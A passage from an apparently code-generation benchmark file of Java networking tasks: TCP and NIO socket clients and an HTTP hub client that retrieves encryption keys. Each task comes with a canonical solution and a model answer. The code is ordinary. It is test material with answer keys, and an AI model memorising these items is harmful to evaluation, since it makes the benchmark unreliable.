   }\n\n        return executeAndDefaultAssertions(requestBuilder.build());\n    }\n\n    public HttpResponse<String> browserGet(String uri) throws IOException, InterruptedException {\n        HttpRequest request = HttpRequest.newBuilder()\n                .uri(URI.create(uri))\n                .header(\"User-Agent\", browserHeader()[1])\n                .GET()\n                .build();\n\n        return executeAndDefaultAssertions(request);\n    }\n\n    public HttpResponse<String> post(String path) throws IOException, InterruptedException {\n        StringBuilder uriBuilder = new StringBuilder(\"http://\");\n        uriBuilder.append(address.getHostString()).append(\":\").append(address.getPort()).append(path);\n\n        HttpRequest request = HttpRequest.newBuilder()\n                .uri(URI.create(uriBuilder.toString()))\n                .POST(HttpRequest.BodyPublishers.noBody())\n                .build();\n\n        return executeAndDefaultAssertions(request);\n    }\n\n    public List<String> getAllRedirectLocations(String path, String[]... headers) throws IOException, InterruptedException {\n        List<String> redirectLocations = new ArrayList<>();\n        StringBuilder uriBuilder = new StringBuilder(\"http://\");\n        String currentUrl = uriBuilder.append(address.getHostString()).append(\":\").append(address.getPort()).append(path).toString();\n\n        while (true) {\n            HttpRequest request = HttpRequest.newBuilder()\n                    .uri(URI.create(currentUrl))\n                    .GET();\n\n            for (String[] header : headers) {\n                request.header(header[0], header[1]);\n            }\n\n            HttpResponse<String> response = httpClient.send(request, HttpResponse.BodyHandlers.ofString());\n\n            if (response.statusCode() == 301 || response.statusCode() == 302) {\n                String location = response.headers().firstValue(\"Location\").orElse(null);\n                if (location == null) {\n                    break;\n                }\n                redirectLocations.add(location);\n                currentUrl = location;\n            } else {\n                break;\n            }\n        }\n\n        return redirectLocations;\n    }\n\n    public static String[] browserHeader() {\n        return new String[]{\"User-Agent\", \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\"};\n    }\n}\n```"
  },
  {
    "Task_id": 420,
    "Instruction": "Task Description: Create a TCP client class in Java that establishes a connection to a server, sends a message, and properly handles the connection lifecycle including cleanup.\n\nClass Description: The TCPClient class encapsulates functionality for creating a TCP client that connects to a specified server, sends a UTF-8 encoded message, and manages socket resources. It handles potential network exceptions and ensures proper resource cleanup.\n\nAttributes:\n- s: Socket - The socket object used for the TCP connection\n- dos: DataOutputStream - The output stream for sending data to the server\n\nMethods:\n- connect(): void - Establishes a connection to the server at 127.0.0.1:5555, sends the message \"Happy\" after a 3-second delay, and handles connection cleanup. No parameters. No return value.",
    "Canonical_solution": "import java.io.DataOutputStream;\nimport java.io.IOException;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\n\npublic class TCPClient {\n\n    public void connect() {\n        Socket s = null;\n        DataOutputStream dos = null;\n        try {\n            s = new Socket(\"127.0.0.1\", 5555);\n            dos = new DataOutputStream(s.getOutputStream());\n            System.out.println(\"Yeah, I connected\");\n            Thread.sleep(3000);\n            dos.writeUTF(\"Happy\");\n            dos.flush();\n        } catch (UnknownHostException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        } finally {\n            try {\n                if (dos != null) {\n                    dos.close();\n                }\n                if (s != null) {\n                    s.close();\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "right_result": "```java\nimport java.io.DataOutputStream;\nimport java.io.IOException;\nimport java.net.Socket;\n\npublic class TCPClient {\n    private Socket s;\n    private DataOutputStream dos;\n\n    public void connect() {\n        try {\n            s = new Socket(\"127.0.0.1\", 5555);\n            dos = new DataOutputStream(s.getOutputStream());\n            Thread.sleep(3000);\n            dos.writeUTF(\"Happy\");\n        } catch (IOException | InterruptedException e) {\n            e.printStackTrace();\n        } finally {\n            try {\n                if (dos != null) dos.close();\n                if (s != null) s.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 421,
    "Instruction": "Task Description: Create a TCP client class in Java that can connect to a server, send messages, receive responses, and properly close the connection.\n\nClass Description: The SocketClient class provides functionality for establishing a TCP connection to a server, sending messages, receiving responses, and managing connection resources. It encapsulates the socket communication logic using Java's IO and networking classes.\n\nAttributes:\n- theSocket: Socket - The socket object representing the connection to the server\n- out: PrintWriter - The output stream writer for sending data to the server\n- networkIn: BufferedReader - The input stream reader for receiving data from the server\n\nMethods:\n- connect(String host, int port) -> void - Establishes a connection to the specified server host and port. Throws IOException if connection fails.\n- sendMessage(String message) -> void - Sends a message to the connected server. The message is automatically flushed.\n- readResponse() -> String - Reads a line of response from the server. Throws IOException if reading fails.\n- close() -> void - Closes all connection resources (socket, input and output streams) safely. Handles any IOExceptions internally.",
    "Canonical_solution": "import java.io.*;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\n\npublic class SocketClient {\n\n    private Socket theSocket;\n    private PrintWriter out;\n    private BufferedReader networkIn;\n\n    public void connect(String host, int port) throws IOException {\n        theSocket = new Socket(host, port);\n        networkIn = new BufferedReader(new InputStreamReader(theSocket.getInputStream()));\n        out = new PrintWriter(theSocket.getOutputStream());\n    }\n\n    public void sendMessage(String message) {\n        out.println(message);\n        out.flush();\n    }\n\n    public String readResponse() throws IOException {\n        return networkIn.readLine();\n    }\n\n    public void close() {\n        try {\n            if (networkIn != null) networkIn.close();\n            if (out != null) out.close();\n            if (theSocket != null) theSocket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\n\npublic class SocketClient {\n    private Socket theSocket;\n    private PrintWriter out;\n    private BufferedReader networkIn;\n\n    public void connect(String host, int port) throws IOException {\n        theSocket = new Socket(host, port);\n        out = new PrintWriter(theSocket.getOutputStream(), true);\n        networkIn = new BufferedReader(new InputStreamReader(theSocket.getInputStream()));\n    }\n\n    public void sendMessage(String message) {\n        if (out != null) {\n            out.println(message);\n        }\n    }\n\n    public String readResponse() throws IOException {\n        if (networkIn != null) {\n            return networkIn.readLine();\n        }\n        return null;\n    }\n\n    public void close() {\n        try {\n            if (networkIn != null) networkIn.close();\n            if (out != null) out.close();\n            if (theSocket != null) theSocket.close();\n        } catch (IOException e) {\n            // Handle or log exception as needed\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 424,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Java's Socket API for establishing connections, sending and receiving data, and managing the connection state.\n\nClass Description: The SocketClient class is a singleton implementation that provides TCP client functionality. It manages a single socket connection, handles data transmission through input/output streams, and maintains connection state. The class includes methods for opening/closing connections, reading/writing data, and checking connection status.\n\nAttributes:\n- socketClient: [SocketClient] - Singleton instance of the class\n- socket: [Socket] - The TCP socket connection\n- outputStream: [OutputStream] - Output stream for sending data\n- inputStream: [InputStream] - Input stream for receiving data\n- isConnected: [boolean] - Connection status flag\n- DEFAULT_READ_BUFFER_SIZE: [int] - Default buffer size for reading data (32KB)\n- buffer: [byte[]] - Temporary buffer for reading data\n- receivedData: [byte[]] - Storage for received data\n\nMethods:\n- getInstance() -> [SocketClient] - Returns the singleton instance of SocketClient\n- openConnection(String ip, int port) -> [void] - Opens a connection to the specified IP and port\n- isConnected() -> [boolean] - Returns the current connection status\n- write(byte[] data) -> [void] - Synchronously writes data to the output stream\n- read(int bytesToBeRead) -> [int] - Synchronously reads specified number of bytes from input stream\n- getReceivedData() -> [byte[]] - Returns the last received data\n- closeConnection() -> [void] - Closes the current connection and cleans up resources",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.Socket;\n\npublic class SocketClient {\n\n    private static SocketClient socketClient = null;\n    private Socket socket;\n    private OutputStream outputStream;\n    private InputStream inputStream;\n    private boolean isConnected = false;\n    public static final int DEFAULT_READ_BUFFER_SIZE = 32 * 1024;\n    private byte[] buffer = new byte[DEFAULT_READ_BUFFER_SIZE];\n    private byte[] receivedData;\n\n    private SocketClient() {\n    }\n\n    public void openConnection(String ip, int port) throws IOException {\n        socket = new Socket(ip, port);\n        outputStream = socket.getOutputStream();\n        inputStream = socket.getInputStream();\n        if (!socket.isConnected()) {\n            isConnected = false;\n            return;\n        }\n        isConnected = true;\n        socket.setTcpNoDelay(true);\n        socket.setKeepAlive(true);\n    }\n\n    public static SocketClient getInstance() {\n        if (socketClient == null) {\n            socketClient = new SocketClient();\n        }\n        return socketClient;\n    }\n\n    public boolean isConnected() {\n        return isConnected;\n    }\n\n    public synchronized void write(byte[] data) throws IOException {\n        if (isConnected && socketClient.isConnected && outputStream != null) {\n            outputStream.write(data);\n        }\n    }\n\n    public synchronized int read(int bytesToBeRead) throws IOException {\n        int numBytesRead = 0;\n        int readNow;\n        int bytesToBeReadTemp = bytesToBeRead;\n        receivedData = new byte[DEFAULT_READ_BUFFER_SIZE];\n        while (numBytesRead < bytesToBeRead) {\n            readNow = inputStream.read(buffer, 0, bytesToBeReadTemp);\n            if (readNow <= 0) {\n                return numBytesRead;\n            } else {\n                System.arraycopy(buffer, 0, receivedData, numBytesRead, readNow);\n                numBytesRead += readNow;\n                bytesToBeReadTemp -= readNow;\n            }\n        }\n        return numBytesRead;\n    }\n\n    public byte[] getReceivedData() {\n        return receivedData;\n    }\n\n    public void closeConnection() {\n        try {\n            if (isConnected) {\n                inputStream.close();\n                outputStream.close();\n                socket.close();\n                isConnected = false;\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\n\npublic class SocketClient {\n    private static final SocketClient socketClient = new SocketClient();\n    private Socket socket;\n    private OutputStream outputStream;\n    private InputStream inputStream;\n    private boolean isConnected = false;\n    private static final int DEFAULT_READ_BUFFER_SIZE = 32768;\n    private byte[] buffer = new byte[DEFAULT_READ_BUFFER_SIZE];\n    private byte[] receivedData;\n\n    public static SocketClient getInstance() {\n        return socketClient;\n    }\n\n    private SocketClient() {}\n\n    public void openConnection(String ip, int port) throws IOException {\n        if (isConnected) {\n            closeConnection();\n        }\n        socket = new Socket(ip, port);\n        outputStream = socket.getOutputStream();\n        inputStream = socket.getInputStream();\n        isConnected = true;\n    }\n\n    public boolean isConnected() {\n        return isConnected;\n    }\n\n    public void write(byte[] data) throws IOException {\n        if (!isConnected) {\n            throw new IOException(\"Not connected to the server.\");\n        }\n        outputStream.write(data);\n        outputStream.flush();\n    }\n\n    public int read(int bytesToBeRead) throws IOException {\n        if (!isConnected) {\n            throw new IOException(\"Not connected to the server.\");\n        }\n        int bytesRead = inputStream.read(buffer, 0, Math.min(bytesToBeRead, buffer.length));\n        if (bytesRead > 0) {\n            receivedData = new byte[bytesRead];\n            System.arraycopy(buffer, 0, receivedData, 0, bytesRead);\n        }\n        return bytesRead;\n    }\n\n    public byte[] getReceivedData() {\n        return receivedData;\n    }\n\n    public void closeConnection() {\n        try {\n            if (outputStream != null) outputStream.close();\n            if (inputStream != null) inputStream.close();\n            if (socket != null) socket.close();\n            isConnected = false;\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 426,
    "Instruction": "Task Description: Implement a Java class that provides TCP client functionality using Java NIO (Non-blocking I/O) for efficient network communication. The class should support both plaintext and SSL connections, manage multiple connections, and handle connection lifecycle operations.\n\nClass Description: The NioTcpClient class is a non-blocking TCP client implementation using Java NIO. It manages multiple socket connections, handles connection establishment, and provides methods for connection management. It supports both plaintext and SSL connections through a configurable transmission mechanism.\n\nAttributes:\n- nioSelector: Selector - The NIO selector used for managing multiple channels\n- keyMap: Map<String, SelectionKey> - Maps connection IDs to their corresponding selection keys\n- time: Time - Provides time-related functionality\n- sslFactory: SSLFactory - Handles SSL-related operations if SSL connections are used\n- networkConfig: NetworkConfig - Contains network configuration parameters\n\nMethods:\n- NioTcpClient(Time, SSLFactory, NetworkConfig) -> NioTcpClient - Constructor that initializes the selector, time, SSL factory, and network configuration\n- connect(InetSocketAddress, int, int, PortType) -> String - Establishes a new connection to the specified address with given buffer sizes and port type, returns a connection ID\n- generateConnectionId(SocketChannel) -> String - Generates a unique connection ID based on local and remote socket addresses\n- createTransmission(String, SelectionKey, String, int, PortType, SSLFactory.Mode) -> Transmission - Creates an appropriate transmission object (plaintext or SSL) for the connection\n- disconnect(String) -> void - Disconnects the connection with the specified ID\n- close() -> void - Closes all connections and releases all resources",
    "Canonical_solution": "import com.github.ambry.network.NetworkSend;\nimport com.github.ambry.network.NetworkReceive;\nimport com.github.ambry.network.PortType;\nimport com.github.ambry.commons.SSLFactory;\nimport com.github.ambry.config.NetworkConfig;\nimport com.github.ambry.utils.Time;\nimport java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.SocketChannel;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class NioTcpClient {\n\n  private final java.nio.channels.Selector nioSelector;\n  private final Map<String, SelectionKey> keyMap;\n  private final Time time;\n  private final SSLFactory sslFactory;\n  private final NetworkConfig networkConfig;\n\n  public NioTcpClient(Time time, SSLFactory sslFactory, NetworkConfig networkConfig) throws IOException {\n    this.nioSelector = java.nio.channels.Selector.open();\n    this.time = time;\n    this.keyMap = new HashMap<>();\n    this.sslFactory = sslFactory;\n    this.networkConfig = networkConfig;\n  }\n\n  public String connect(InetSocketAddress address, int sendBufferSize, int receiveBufferSize, PortType portType)\n      throws IOException {\n    SocketChannel channel = SocketChannel.open();\n    channel.configureBlocking(false);\n    channel.socket().setKeepAlive(true);\n    channel.socket().setSendBufferSize(sendBufferSize);\n    channel.socket().setReceiveBufferSize(receiveBufferSize);\n    channel.socket().setTcpNoDelay(true);\n    try {\n      channel.connect(address);\n    } catch (IOException e) {\n      channel.close();\n      throw e;\n    }\n    String connectionId = generateConnectionId(channel);\n    SelectionKey key = channel.register(this.nioSelector, SelectionKey.OP_CONNECT);\n    Transmission transmission = createTransmission(connectionId, key, address.getHostName(), address.getPort(), portType,\n        SSLFactory.Mode.CLIENT);\n    key.attach(transmission);\n    this.keyMap.put(connectionId, key);\n    return connectionId;\n  }\n\n  private String generateConnectionId(SocketChannel channel) {\n    return channel.socket().getLocalAddress().getHostAddress() + \":\" + channel.socket().getLocalPort() + \"-\" +\n        channel.socket().getInetAddress().getHostAddress() + \":\" + channel.socket().getPort();\n  }\n\n  protected Transmission createTransmission(String connectionId, SelectionKey key, String hostname, int port,\n      PortType portType, SSLFactory.Mode mode) throws IOException {\n    if (portType == PortType.PLAINTEXT) {\n      return new PlainTextTransmission(connectionId, (SocketChannel) key.channel(), key, time, null, networkConfig);\n    } else if (portType == PortType.SSL) {\n      return new SSLTransmission(sslFactory, connectionId, (SocketChannel) key.channel(), key, hostname, port, time,\n          null, mode, networkConfig);\n    } else {\n      throw new IllegalArgumentException(\"Unsupported portType \" + portType);\n    }\n  }\n\n  public void disconnect(String connectionId) {\n    SelectionKey key = this.keyMap.get(connectionId);\n    if (key != null) {\n      key.cancel();\n    }\n  }\n\n  public void close() throws IOException {\n    for (SelectionKey key : this.nioSelector.keys()) {\n      Transmission transmission = (Transmission) key.attachment();\n      if (transmission != null) {\n        transmission.close();\n      }\n      key.channel().close();\n    }\n    this.nioSelector.close();\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 6,
    "right_result": "```java\nimport java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.SocketChannel;\nimport java.util.Map;\nimport java.util.concurrent.ConcurrentHashMap;\n\npublic class NioTcpClient {\n    private final Selector nioSelector;\n    private final Map<String, SelectionKey> keyMap = new ConcurrentHashMap<>();\n    private final Time time;\n    private final SSLFactory sslFactory;\n    private final NetworkConfig networkConfig;\n\n    public NioTcpClient(Time time, SSLFactory sslFactory, NetworkConfig networkConfig) throws IOException {\n        this.nioSelector = Selector.open();\n        this.time = time;\n        this.sslFactory = sslFactory;\n        this.networkConfig = networkConfig;\n    }\n\n    public String connect(InetSocketAddress address, int readBufferSize, int writeBufferSize, PortType portType) throws IOException {\n        SocketChannel socketChannel = SocketChannel.open();\n        socketChannel.configureBlocking(false);\n        socketChannel.connect(address);\n\n        String connectionId = generateConnectionId(socketChannel);\n        SelectionKey selectionKey = socketChannel.register(nioSelector, SelectionKey.OP_CONNECT);\n        Transmission transmission = createTransmission(connectionId, selectionKey, readBufferSize, writeBufferSize, portType, sslFactory.getMode());\n        selectionKey.attach(transmission);\n        keyMap.put(connectionId, selectionKey);\n\n        return connectionId;\n    }\n\n    protected String generateConnectionId(SocketChannel channel) {\n        InetSocketAddress localAddress = (InetSocketAddress) channel.getLocalAddress();\n        InetSocketAddress remoteAddress = (InetSocketAddress) channel.getRemoteAddress();\n        return localAddress.getAddress().getHostAddress() + \":\" + localAddress.getPort()\n                + \"-\" + remoteAddress.getAddress().getHostAddress() + \":\" + remoteAddress.getPort();\n    }\n\n    protected Transmission createTransmission(String id, SelectionKey key, int readBufferSize, int writeBufferSize, PortType portType, SSLFactory.Mode mode) {\n        if (mode == SSLFactory.Mode.CLIENT) {\n            return new SslTransmission(id, key, readBufferSize, writeBufferSize, sslFactory, time);\n        } else {\n            return new PlainTextTransmission(id, key, readBufferSize, writeBufferSize, time);\n        }\n    }\n\n    public void disconnect(String connectionId) {\n        SelectionKey key = keyMap.remove(connectionId);\n        if (key != null) {\n            Transmission transmission = (Transmission) key.attachment();\n            transmission.close();\n            try {\n                ((SocketChannel) key.channel()).close();\n            } catch (IOException e) {\n                // Handle exception\n            }\n        }\n    }\n\n    public void close() throws IOException {\n        for (String id : keyMap.keySet()) {\n            disconnect(id);\n        }\n        nioSelector.close();\n    }\n}\n```"
  },
  {
    "Task_id": 428,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Java NIO (Non-blocking I/O) to send messages to a server. The client should support multiple sender threads, track total bytes and messages sent, and allow for both direct and heap byte buffers.\n\nClass Description: NioClientTest is a TCP client implementation that uses Java NIO's SocketChannel to communicate with a server. It manages multiple sender threads, tracks performance metrics, and provides interactive control via console input.\n\nAttributes:\n- running: boolean - Flag to control the main loop's execution\n- total_bytes_sent: LongAdder - Counter for total bytes sent to the server\n- total_msgs: LongAdder - Counter for total messages sent to the server\n- senders: Sender[] - Array of sender threads\n\nMethods:\n- create(int size, boolean direct) -> ByteBuffer - Creates a new ByteBuffer with specified size and type (direct or heap)\n- start(InetAddress host, boolean direct, int num_threads) -> void - Main method to start the client and handle user input\n- sendMessages(InetAddress host, boolean direct, int num_threads) -> void - Creates and starts sender threads\n- Sender(InetAddress host, boolean direct, CountDownLatch latch) -> void - Constructor for the inner Sender class\n- run() -> void - The Sender thread's main execution method (connects to server and sends data)\n\nInner Class: Sender extends Thread\nAttributes:\n- ch: SocketChannel - The channel used for communication\n- latch: CountDownLatch - Synchronization aid for thread coordination\n- host: InetAddress - The server's host address\n- direct: boolean - Flag for buffer type (direct or heap)\n- buf: ByteBuffer - The buffer used for message data\n\nMethods:\n- run() -> void - Connects to server, waits for latch, then sends messages until byte limit is reached",
    "Canonical_solution": "import org.jgroups.util.Util;\nimport java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SocketChannel;\nimport java.util.concurrent.CountDownLatch;\nimport java.util.concurrent.atomic.LongAdder;\n\npublic class NioClientTest {\n    protected volatile boolean running=true;\n    protected final LongAdder total_bytes_sent=new LongAdder();\n    protected final LongAdder total_msgs=new LongAdder();\n    protected Sender[] senders;\n\n    protected static ByteBuffer create(int size, boolean direct) {\n        return direct? ByteBuffer.allocateDirect(size) : ByteBuffer.allocate(size);\n    }\n\n    protected void start(InetAddress host, boolean direct, int num_threads) throws Exception {\n        boolean looping=true;\n        while(looping) {\n            int c=Util.keyPress(\"[1] send [x] exit\");\n            switch(c) {\n                case '1':\n                    sendMessages(host, direct, num_threads);\n                    break;\n                case 'x':\n                case -1:\n                    looping=false;\n                    break;\n            }\n        }\n    }\n\n    protected void sendMessages(InetAddress host, boolean direct, int num_threads) throws Exception {\n        total_msgs.reset();\n        total_bytes_sent.reset();\n        senders=new Sender[num_threads];\n        final CountDownLatch latch=new CountDownLatch(1);\n        for(int i=0; i < senders.length; i++)\n            senders[i]=new Sender(host, direct, latch);\n        for(Sender sender: senders)\n            sender.start();\n        latch.countDown();\n        for(Sender sender: senders)\n            sender.join();\n    }\n\n    protected class Sender extends Thread {\n        protected SocketChannel ch;\n        protected final CountDownLatch latch;\n        protected final InetAddress host;\n        protected final boolean direct;\n        protected final ByteBuffer buf;\n\n        public Sender(InetAddress host, boolean direct, CountDownLatch latch) {\n            this.latch=latch;\n            this.host=host;\n            this.direct=direct;\n            buf=create(NioServerPerfTest.SIZE, direct);\n        }\n\n        public void run() {\n            try {\n                ch=SocketChannel.open();\n                ch.configureBlocking(true);\n                ch.connect(new InetSocketAddress(host, 7500));\n                latch.await();\n            }\n            catch(Exception e) {\n                e.printStackTrace();\n            }\n            for(;;) {\n                total_bytes_sent.add(NioServerPerfTest.SIZE);\n                if(total_bytes_sent.sum() > NioServerPerfTest.BYTES_TO_SEND)\n                    break;\n                buf.rewind();\n                try {\n                    ch.write(buf);\n                    total_msgs.increment();\n                }\n                catch(IOException e) {\n                    e.printStackTrace();\n                }\n            }\n            Util.close(ch);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 6,
    "right_result": "```java\nimport java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.SocketAddress;\nimport java.net.UnknownHostException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SocketChannel;\nimport java.util.concurrent.CountDownLatch;\nimport java.util.concurrent.ThreadLocalRandom;\nimport java.util.concurrent.atomic.LongAdder;\n\npublic class NioClientTest {\n    private volatile boolean running = true;\n    private final LongAdder total_bytes_sent = new LongAdder();\n    private final LongAdder total_msgs = new LongAdder();\n\n    private static class Sender extends Thread {\n        private final SocketChannel ch;\n        private final CountDownLatch latch;\n        private final InetAddress host;\n        private final boolean direct;\n        private final ByteBuffer buf;\n        private static final int MSG_SIZE = 1024;\n        private static final long TOTAL_BYTES_TO_SEND = 10 * 1024 * 1024; // 10MB\n\n        public Sender(InetAddress host, boolean direct, CountDownLatch latch) throws IOException {\n            this.host = host;\n            this.direct = direct;\n            this.latch = latch;\n            this.ch = SocketChannel.open();\n            this.ch.configureBlocking(false);\n            this.ch.connect(new java.net.InetSocketAddress(host, 8080));\n            this.buf = NioClientTest.create(MSG_SIZE, direct);\n        }\n\n        @Override\n        public void run() {\n            try {\n                while (!ch.finishConnect()) {\n                    Thread.yield();\n                }\n                latch.countDown();\n                latch.await();\n                while (total_bytes_sent.sum() < TOTAL_BYTES_TO_SEND && running) {\n                    if (!buf.hasRemaining()) {\n                        buf.rewind();\n                        for (int i = 0; i < buf.limit(); i++) {\n                            buf.put((byte) ThreadLocalRandom.current().nextInt(0, 256));\n                        }\n                        buf.flip();\n                    }\n                    ch.write(buf);\n                    if (buf.remaining() == 0) {\n                        total_bytes_sent.add(MSG_SIZE);\n                        total_msgs.increment();\n                        buf.clear();\n                    }\n                }\n            } catch (IOException | InterruptedException e) {\n                e.printStackTrace();\n            } finally {\n                try {\n                    ch.close();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n\n    public static ByteBuffer create(int size, boolean direct) {\n        return direct ? ByteBuffer.allocateDirect(size) : ByteBuffer.allocate(size);\n    }\n\n    public void start(InetAddress host, boolean direct, int num_threads) {\n        sendMessages(host, direct, num_threads);\n    }\n\n    public void sendMessages(InetAddress host, boolean direct, int num_threads) {\n        CountDownLatch latch = new CountDownLatch(num_threads);\n        Sender[] senders = new Sender[num_threads];\n        for (int i = 0; i < num_threads; i++) {\n            try {\n                senders[i] = new Sender(host, direct, latch);\n                senders[i].start();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n        try {\n            latch.await();\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 43,
    "Instruction": "Task Description: Create a Java class that implements an HTTP client for interacting with a hub API, handling authentication, and processing various API responses to retrieve encryption keys.\n\nClass Description: The HubHttpClient class provides functionality to communicate with a hub API, manage authentication using bearer tokens, and handle different API response scenarios to retrieve encryption keys. It supports both modern and legacy API versions.\n\nAttributes:\n\nhttpClient: [HttpClient] - The HTTP client instance used for making requests\nbearerToken: [String] - The bearer token used for authentication\nhubConfig: [HubConfig] - Configuration containing API URIs\ndeviceId: [String] - Identifier for the device making requests\nvaultId: [String] - Identifier for the vault being accessed\n\nMethods:\n\nconstructor: [HubHttpClient]([ExecutorService executor, HubConfig hubConfig, String deviceId, String bearerToken, String vaultId]) -> [void] - Initializes the HTTP client with configuration and authentication details\nrequestApiConfig: [requestApiConfig]() -> [CompletableFuture<ReceivedKey>] - Initiates the API configuration request chain\nhandleApiConfigResponse: [handleApiConfigResponse]([HttpResponse<String> response]) -> [CompletableFuture<ReceivedKey>] - Processes the API configuration response\nrequestDeviceData: [requestDeviceData]() -> [CompletableFuture<ReceivedKey>] - Requests device-specific data from the API\nhandleDeviceDataResponse: [handleDeviceDataResponse]([HttpResponse<String> response]) -> [CompletableFuture<ReceivedKey>] - Processes the device data response\nrequestVaultMasterkey: [requestVaultMasterkey]([String encryptedUserKey]) -> [CompletableFuture<ReceivedKey>] - Requests the vault master key\nhandleVaultMasterkeyResponse: [handleVaultMasterkeyResponse]([String encryptedUserKey, HttpResponse<String> response]) -> [ReceivedKey] - Processes the vault master key response\nrequestLegacyAccessToken: [requestLegacyAccessToken]() -> [CompletableFuture<ReceivedKey>] - Requests a legacy access token\nhandleLegacyAccessTokenResponse: [handleLegacyAccessTokenResponse]([HttpResponse<String> response]) -> [ReceivedKey] - Processes the legacy access token response\nretrievalFailed: [retrievalFailed]([Throwable cause]) -> [ReceivedKey] - Handles request failures",
    "Canonical_solution": "import com.fasterxml.jackson.annotation.JsonIgnoreProperties;\nimport com.fasterxml.jackson.annotation.JsonProperty;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport com.google.common.base.Preconditions;\nimport com.nimbusds.jose.JWEObject;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport java.io.IOException;\nimport java.io.UncheckedIOException;\nimport java.net.URI;\nimport java.net.http.HttpClient;\nimport java.net.http.HttpRequest;\nimport java.net.http.HttpResponse;\nimport java.nio.charset.StandardCharsets;\nimport java.text.ParseException;\nimport java.time.Duration;\nimport java.util.Objects;\nimport java.util.concurrent.CompletableFuture;\nimport java.util.concurrent.ExecutorService;\n\npublic class HubHttpClient {\n\n\tprivate static final Logger LOG = LoggerFactory.getLogger(HubHttpClient.class);\n\tprivate static final ObjectMapper JSON = new ObjectMapper().setDefaultLeniency(true);\n\tprivate static final Duration REQ_TIMEOUT = Duration.ofSeconds(10);\n\n\tprivate final HttpClient httpClient;\n\tprivate final String bearerToken;\n\tprivate final HubConfig hubConfig;\n\tprivate final String deviceId;\n\tprivate final String vaultId;\n\n\tpublic HubHttpClient(ExecutorService executor, HubConfig hubConfig, String deviceId, String bearerToken, String vaultId) {\n\t\tthis.httpClient = HttpClient.newBuilder().version(HttpClient.Version.HTTP_1_1).executor(executor).build();\n\t\tthis.bearerToken = Objects.requireNonNull(bearerToken);\n\t\tthis.hubConfig = hubConfig;\n\t\tthis.deviceId = deviceId;\n\t\tthis.vaultId = vaultId;\n\t}\n\n\tpublic CompletableFuture<ReceivedKey> requestApiConfig() {\n\t\tvar configUri = hubConfig.URIs.API.resolve(\"config\");\n\t\tvar request = HttpRequest.newBuilder(configUri)\n\t\t\t\t.GET()\n\t\t\t\t.timeout(REQ_TIMEOUT)\n\t\t\t\t.build();\n\t\treturn httpClient.sendAsync(request, HttpResponse.BodyHandlers.ofString(StandardCharsets.US_ASCII))\n\t\t\t\t.thenCompose(this::handleApiConfigResponse)\n\t\t\t\t.exceptionally(this::retrievalFailed);\n\t}\n\n\tprivate CompletableFuture<ReceivedKey> handleApiConfigResponse(HttpResponse<String> response) {\n\t\tLOG.debug(\"GET {} -> Status Code {}\", response.request().uri(), response.statusCode());\n\t\tPreconditions.checkState(response.statusCode() == 200, \"Unexpected response \" + response.statusCode());\n\t\ttry {\n\t\t\tvar config = JSON.reader().readValue(response.body(), ConfigDto.class);\n\t\t\tif (config.apiLevel >= 1) {\n\t\t\t\treturn requestDeviceData();\n\t\t\t} else {\n\t\t\t\treturn requestLegacyAccessToken();\n\t\t\t}\n\t\t} catch (IOException e) {\n\t\t\tthrow new UncheckedIOException(e);\n\t\t}\n\t}\n\n\tprivate CompletableFuture<ReceivedKey> requestDeviceData() {\n\t\tvar deviceUri = hubConfig.URIs.API.resolve(\"devices/\" + deviceId);\n\t\tvar request = HttpRequest.newBuilder(deviceUri)\n\t\t\t\t.header(\"Authorization\", \"Bearer \" + bearerToken)\n\t\t\t\t.GET()\n\t\t\t\t.timeout(REQ_TIMEOUT)\n\t\t\t\t.build();\n\t\treturn httpClient.sendAsync(request, HttpResponse.BodyHandlers.ofString(StandardCharsets.UTF_8))\n\t\t\t\t.thenCompose(this::handleDeviceDataResponse)\n\t\t\t\t.exceptionally(this::retrievalFailed);\n\t}\n\n\tprivate CompletableFuture<ReceivedKey> handleDeviceDataResponse(HttpResponse<String> response) {\n\t\tLOG.debug(\"GET {} -> Status Code {}\", response.request().uri(), response.statusCode());\n\t\ttry {\n\t\t\tswitch (response.statusCode()) {\n\t\t\t\tcase 200 -> {\n\t\t\t\t\tvar device = JSON.reader().readValue(response.body(), 